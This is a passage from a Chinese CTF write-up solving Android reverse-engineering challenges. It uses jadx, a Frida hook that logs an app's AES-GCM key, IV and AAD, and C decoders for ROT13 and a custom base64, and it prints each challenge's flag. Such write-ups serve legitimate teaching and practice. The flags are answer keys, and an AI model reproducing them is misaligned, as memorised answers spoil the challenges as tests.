class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">strlen</span>(a);i++)<br>&#123;<br>a[i]-=<span class="hljs-number">3</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,a[i]);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>解得：VNCTF{JUst_$ne_Iast_dance_2025!</p><p>故最后得到flag：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">VNCTF&#123;JUst_$ne_Iast_dance_2025!&#125;<br></code></pre></td></tr></table></figure><h2 id="kotlindroid"><a href="#kotlindroid" class="headerlink" title="kotlindroid"></a>kotlindroid</h2><p>很奇怪的非常规题，最后才出的</p><p>jadx看逻辑</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209125310512.png" alt="image-20250209125310512"></p><p>翻了很久不断交叉引用找到了加密逻辑：AES&#x2F;GCM&#x2F;NoPadding</p><p>iv是114514，密文是MTE0NTE0HMuJKLOW1BqCAi2MxpHYjGjpPq82XXQ&#x2F;jgx5WYrZ2MV53a9xjQVbRaVdRiXFrSn6EcQPzA&#x3D;&#x3D;，缺少add和key</p><p>然后尝试frida hook</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// Hook JNI 类的方法</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">JNI</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.atri.ezcompose.JNI&quot;</span>);<br>    <span class="hljs-variable constant_">JNI</span>.<span class="hljs-property">getAt</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;[+] JNI.getAt() called&#x27;</span>);<br>        <span class="hljs-keyword">const</span> result = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAt</span>();<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[*] JNI.getAt() returned: <span class="hljs-subst">$&#123;result&#125;</span>`</span>);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;;<br><br>    <span class="hljs-comment">// Hook SearchActivityKt 类的方法</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-title class_">SearchActivityKt</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.atri.ezcompose.SearchActivityKt&quot;</span>);<br><br>    <span class="hljs-title class_">SearchActivityKt</span>.<span class="hljs-property">check</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">text, context, key</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;[+] check() called&#x27;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`    Text: <span class="hljs-subst">$&#123;text&#125;</span>`</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`    Context: <span class="hljs-subst">$&#123;context&#125;</span>`</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`    Key: <span class="hljs-subst">$&#123;key&#125;</span>`</span>);<br>        <br>        <span class="hljs-keyword">const</span> isValid = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">check</span>(text, context, key);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[*] check() result: <span class="hljs-subst">$&#123;isValid&#125;</span>`</span>);<br>        <span class="hljs-keyword">return</span> isValid;<br>    &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure><p>hook结果</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[+]</span> <span class="hljs-built_in">check</span>() called<br>    Text: hhh<br>    Context: com<span class="hljs-selector-class">.atri</span><span class="hljs-selector-class">.ezcompose</span>.SearchActivity@af9c1c8<br>    Key: <span class="hljs-number">97</span>,<span class="hljs-number">116</span>,<span class="hljs-number">114</span>,<span class="hljs-number">105</span>,<span class="hljs-number">107</span>,<span class="hljs-number">101</span>,<span class="hljs-number">121</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">121</span>,<span class="hljs-number">101</span>,<span class="hljs-number">107</span>,<span class="hljs-number">105</span>,<span class="hljs-number">114</span>,<span class="hljs-number">116</span>,<span class="hljs-number">97</span><br><span class="hljs-selector-attr">[*]</span> <span class="hljs-built_in">check</span>() result: undefined<br><span class="hljs-selector-attr">[+]</span> <span class="hljs-built_in">generateIV</span>() called<br><span class="hljs-selector-attr">[*]</span> <span class="hljs-built_in">generateIV</span>() returned: <span class="hljs-number">49</span>,<span class="hljs-number">49</span>,<span class="hljs-number">52</span>,<span class="hljs-number">53</span>,<span class="hljs-number">49</span>,<span class="hljs-number">52</span><br><span class="hljs-selector-attr">[+]</span> JNI<span class="hljs-selector-class">.getAt</span>() called<br><span class="hljs-selector-attr">[*]</span> JNI<span class="hljs-selector-class">.getAt</span>() returned: mysecretadd<br></code></pre></td></tr></table></figure><p>hook得到key是atrikeyssyekirta</p><p>add是mysecretadd</p><p> 这里有点小坑，密文解完base64前6位是iv，后面才是真正的密文</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209170228965.png" alt="image-20250209170228965"></p><p>真正的密文是1ccb8928b396d41a82022d8cc691d88c68e93eaf365d743f8e0c79598ad9d8c579ddaf718d055b45a55d4625c5ad29fa11c40fcc（16进制）</p><p>赛博厨子梭了</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209135614226.png" alt="image-20250209135614226"></p><p>得到flag：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">VNCTF&#123;<span class="hljs-symbol">Y0U_@</span>re_th3_Ma5t3r_0f_C0mp0s3&#125;<br></code></pre></td></tr></table></figure><h2 id="AndroidLux-赛后做出"><a href="#AndroidLux-赛后做出" class="headerlink" title="AndroidLux(赛后做出)"></a>AndroidLux(赛后做出)</h2><p>jadx审逻辑</p><p>flag验证</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209201918652.png" alt="image-20250209201918652"></p><p>起了一个socket环境</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209201707600.png" alt="image-20250209201707600"></p><p>把&#x2F;assets下的busybox和env复制到指定路径，env其实是个tar.xz,并解压</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209201746813.png" alt="image-20250209201746813"></p><p>没有看到有加载native so，所以去&#x2F;assets目录下复制出来env并解压</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">mv</span> env env.tar.xz<br>tar <span class="hljs-literal">-xJvf</span> env.tar.xz<br></code></pre></td></tr></table></figure><p>然后得到一大堆文件</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209202249475.png" alt="image-20250209202249475"></p><p>翻了半天无果，然后有小提示，用Everything去看文件的修改时间，有</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209202349910.png" alt="image-20250209202349910"></p><p>有一个env的elf文件，然后还有一个libexec.so比较可疑</p><p>先分析env</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209202457766.png" alt="image-20250209202457766"></p><p>有个魔改且变表的base64</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs C">v16 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( len % <span class="hljs-number">3</span> )<br>    v3 = <span class="hljs-number">4</span>;<br>  <span class="hljs-keyword">else</span><br>    v3 = <span class="hljs-number">0</span>;<br>  v13 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">4</span> * (len / <span class="hljs-number">3</span>) + <span class="hljs-number">1</span> + v3);<br>  <span class="hljs-keyword">for</span> ( i1 = <span class="hljs-number">0</span>; i1 &lt; len; ++i1 )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( len - i1 &lt;= <span class="hljs-number">2</span> )<br>    &#123;<br>      v13[v16] = base64[input[i1] &gt;&gt; <span class="hljs-number">2</span>];<br>      <span class="hljs-keyword">if</span> ( len - i1 == <span class="hljs-number">2</span> )<br>      &#123;<br>        v7 = input[i1++] &amp; <span class="hljs-number">3</span>;<br>        v13[v16 + <span class="hljs-number">1</span>] = base64[v7 | (input[i1] &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0x3C</span>];<br>        v13[v16 + <span class="hljs-number">2</span>] = base64[input[i1] &amp; <span class="hljs-number">0xF</span>];<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        v13[v16 + <span class="hljs-number">1</span>] = base64[input[i1] &amp; <span class="hljs-number">3</span>];<br>        v13[v16 + <span class="hljs-number">2</span>] = <span class="hljs-number">61</span>;<br>      &#125;<br>      v8 = v16 + <span class="hljs-number">3</span>;<br>      v16 += <span class="hljs-number">4</span>;<br>      v13[v8] = <span class="hljs-number">61</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v13[v16] = base64[input[i1] &gt;&gt; <span class="hljs-number">2</span>];<br>      v4 = input[i1] &amp; <span class="hljs-number">3</span>;<br>      i2 = i1 + <span class="hljs-number">1</span>;<br>      v13[v16 + <span class="hljs-number">1</span>] = base64[v4 | (input[i2] &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0x3C</span>];<br>      v5 = input[i2] &amp; <span class="hljs-number">0xF</span>;<br>      i1 = i2 + <span class="hljs-number">1</span>;<br>      v13[v16 + <span class="hljs-number">2</span>] = base64[v5 | (<span class="hljs-number">16</span> * (input[i1] &gt;&gt; <span class="hljs-number">6</span>))];<br>      v6 = v16 + <span class="hljs-number">3</span>;<br>      v16 += <span class="hljs-number">4</span>;<br>      v13[v6] = base64[input[i1] &amp; <span class="hljs-number">0x3F</span>];<br>    &#125;<br>  &#125;<br>  v13[v16] = <span class="hljs-number">0</span>;<br>  result = a3;<br>  *a3 = v13;<br>  <span class="hljs-keyword">return</span> result;<br></code></pre></td></tr></table></figure><p>然后去浏览libexec.so</p><p>发现hook了read和strncmp</p><p>read里面多了一个xor 1</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209202740996.png" alt="image-20250209202740996"></p><p>strncmp里面多了一个ROT13</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/image-20250209202729976.png" alt="image-20250209202729976"></p><p>所以最后解密的顺序是先ROT13,再解魔改base64,最后xor 1</p><p>rot13.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">char</span> *<span class="hljs-title function_">rot13_decrypt</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *input)</span><br> &#123;<br>    <span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(input);<br>    <span class="hljs-type">char</span> *output = <span class="hljs-built_in">malloc</span>(len + <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (output == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;  <br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        <span class="hljs-type">char</span> c = input[i];<br><br>        <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp; c &lt;= <span class="hljs-string">&#x27;M&#x27;</span>) &#123;      <br>            output[i] = c + <span class="hljs-number">13</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">&#x27;N&#x27;</span> &amp;&amp; c &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>) &#123; <br>            output[i] = c - <span class="hljs-number">13</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">&#x27;a&#x27;</span> &amp;&amp; c &lt;= <span class="hljs-string">&#x27;m&#x27;</span>) &#123; <br>            output[i] = c + <span class="hljs-number">13</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">&#x27;n&#x27;</span> &amp;&amp; c &lt;= <span class="hljs-string">&#x27;z&#x27;</span>) &#123;<br>            output[i] = c - <span class="hljs-number">13</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            output[i] = c;<br>        &#125;<br>    &#125;<br>    output[len] = <span class="hljs-string">&#x27;\0&#x27;</span>; <br>    <span class="hljs-keyword">return</span> output;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> <br>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *encrypted = <span class="hljs-string">&quot;RPVIRN40R9PU67ue6RUH88Rgs65Bp8td8VQm4SPAT8Kj97QgVG==&quot;</span>;  <br>    <span class="hljs-type">char</span> *decrypted = rot13_decrypt(encrypted);<br><br>    <span class="hljs-keyword">if</span> (decrypted) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, decrypted);<br>        <span class="hljs-built_in">free</span>(decrypted);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;error\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>得到:ECIVEA40E9CH67hr6EHU88Etf65Oc8gq8IDz4FCNG8Xw97DtIT&#x3D;&#x3D;</p><p>b64.c</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> base64_rev[<span class="hljs-number">256</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init_base64_rev</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-comment">/* 先全部置为 -1 */</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) &#123;<br>        base64_rev[i] = <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *alphabet = <span class="hljs-string">&quot;TUVWXYZabcdefghijABCDEF456789GHIJKLMNOPQRSklmnopqrstuvwxyz0123+/&quot;</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; i++) &#123;<br>        base64_rev[(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)alphabet[i]] = i;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *<span class="hljs-title">decode_custom_base64</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *encoded, <span class="hljs-type">int</span> *out_len)</span> </span>&#123;<br>    <span class="hljs-type">int</span> encoded_len, i, pad = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *decoded;<br>    <span class="hljs-type">int</span> decoded_len;<br>    <br>    <span class="hljs-keyword">if</span> (!encoded) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <br>    encoded_len = <span class="hljs-built_in">strlen</span>(encoded);<br>    <span class="hljs-keyword">if</span> (encoded_len % <span class="hljs-number">4</span> != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;length error\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">/* 统计尾部的 &#x27;=&#x27; 填充字符个数 */</span><br>    <span class="hljs-keyword">if</span> (encoded_len &gt;= <span class="hljs-number">1</span> &amp;&amp; encoded[encoded_len<span class="hljs-number">-1</span>] == <span class="hljs-string">&#x27;=&#x27;</span>)<br>        pad++;<br>    <span class="hljs-keyword">if</span> (encoded_len &gt;= <span class="hljs-number">2</span> &amp;&amp; encoded[encoded_len<span class="hljs-number">-2</span>] == <span class="hljs-string">&#x27;=&#x27;</span>)<br>        pad++;<br>    <br>    <span class="hljs-comment">/* 每 4 个编码字符通常还原 3 个字节，但有填充时少还原 */</span><br>    decoded_len = (encoded_len / <span class="hljs-number">4</span>) * <span class="hljs-number">3</span> - pad;<br>    decoded = <span class="hljs-built_in">malloc</span>(decoded_len);<br>    <span class="hljs-keyword">if</span> (!decoded) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <br>    <span class="hljs-type">int</span> decoded_index = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; encoded_len; i += <span class="hljs-number">4</span>) &#123;<br>        <span class="hljs-type">int</span> d1, d2, d3, d4;<br>        <span class="hljs-type">char</span> ch1 = encoded[i], ch2 = encoded[i+<span class="hljs-number">1</span>], ch3 = encoded[i+<span class="hljs-number">2</span>], ch4 = encoded[i+<span class="hljs-number">3</span>];<br>        <br>        <span class="hljs-comment">/* 如果字符为 &#x27;=&#x27; 则对应值置 0；否则通过反查表获得其 6 位值 */</span><br>        d1 = (ch1 == <span class="hljs-string">&#x27;=&#x27;</span>) ? <span class="hljs-number">0</span> : base64_rev[(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)ch1];<br>        d2 = (ch2 == <span class="hljs-string">&#x27;=&#x27;</span>) ? <span class="hljs-number">0</span> : base64_rev[(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)ch2];<br>        d3 = (ch3 == <span class="hljs-string">&#x27;=&#x27;</span>) ? <span class="hljs-number">0</span> : base64_rev[(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)ch3];<br>        d4 = (ch4 == <span class="hljs-string">&#x27;=&#x27;</span>) ? <span class="hljs-number">0</span> : base64_rev[(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)ch4];<br>        <br>        <span class="hljs-comment">/* 检查字符合法性 */</span><br>        <span class="hljs-keyword">if</span> ((ch1 != <span class="hljs-string">&#x27;=&#x27;</span> &amp;&amp; d1 &lt; <span class="hljs-number">0</span>) || (ch2 != <span class="hljs-string">&#x27;=&#x27;</span> &amp;&amp; d2 &lt; <span class="hljs-number">0</span>) ||<br>            (ch3 != <span class="hljs-string">&#x27;=&#x27;</span> &amp;&amp; d3 &lt; <span class="hljs-number">0</span>) || (ch4 != <span class="hljs-string">&#x27;=&#x27;</span> &amp;&amp; d4 &lt; <span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;NO!\n&quot;</span>);<br>            <span class="hljs-built_in">free</span>(decoded);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        &#125;<br>        <br>        <span class="hljs-comment">/* 根据填充情况决定还原多少字节 */</span><br>        <span class="hljs-keyword">if</span> (ch3 == <span class="hljs-string">&#x27;=&#x27;</span>) &#123;<br>            <span class="hljs-comment">// 仅 1 字节有效</span><br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> a = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)((d1 &lt;&lt; <span class="hljs-number">2</span>) | d2);<br>            decoded[decoded_index++] = a;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ch4 == <span class="hljs-string">&#x27;=&#x27;</span>) &#123;<br>            <span class="hljs-comment">// 2 字节有效</span><br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> a = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)((d1 &lt;&lt; <span class="hljs-number">2</span>) | (d2 &amp; <span class="hljs-number">3</span>));<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> b = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)(((d2 &gt;&gt; <span class="hljs-number">2</span>) &lt;&lt; <span class="hljs-number">4</span>) | d3);<br>            decoded[decoded_index++] = a;<br>            <span class="hljs-keyword">if</span> (decoded_index &lt; decoded_len)<br>                decoded[decoded_index++] = b;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 3 字节完整块</span><br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> a = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)((d1 &lt;&lt; <span class="hljs-number">2</span>) | (d2 &amp; <span class="hljs-number">3</span>));<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> b = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)(((d2 &gt;&gt; <span class="hljs-number">2</span>) &lt;&lt; <span class="hljs-number">4</span>) | (d3 &amp; <span class="hljs-number">0xF</span>));<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> c = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)(((d3 &gt;&gt; <span class="hljs-number">4</span>) &lt;&lt; <span class="hljs-number">6</span>) | d4);<br>            decoded[decoded_index++] = a;<br>            <span class="hljs-keyword">if</span> (decoded_index &lt; decoded_len)<br>                decoded[decoded_index++] = b;<br>            <span class="hljs-keyword">if</span> (decoded_index &lt; decoded_len)<br>                decoded[decoded_index++] = c;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (out_len)<br>        *out_len = decoded_len;<br>    <span class="hljs-keyword">return</span> decoded;<br>&#125;<br><br><span class="hljs-comment">/* 测试示例 */</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span>&#123;<br>    <span class="hljs-comment">/* 初始化反查表 */</span><br>    <span class="hljs-built_in">init_base64_rev</span>();<br><br>    <span class="hljs-comment">/* 示例：设 encoded_str 为用上述编码算法加密后的字符串 */</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *encoded_str = <span class="hljs-string">&quot;ECIVEA40E9CH67hr6EHU88Etf65Oc8gq8IDz4FCNG8Xw97DtIT==&quot;</span>;  <span class="hljs-comment">// 请替换为实际的编码字符串</span><br>    <span class="hljs-type">int</span> decoded_len;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *decoded = <span class="hljs-built_in">decode_custom_base64</span>(encoded_str, &amp;decoded_len);<br>    <span class="hljs-keyword">if</span> (!decoded) &#123;<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">for</span> (<span 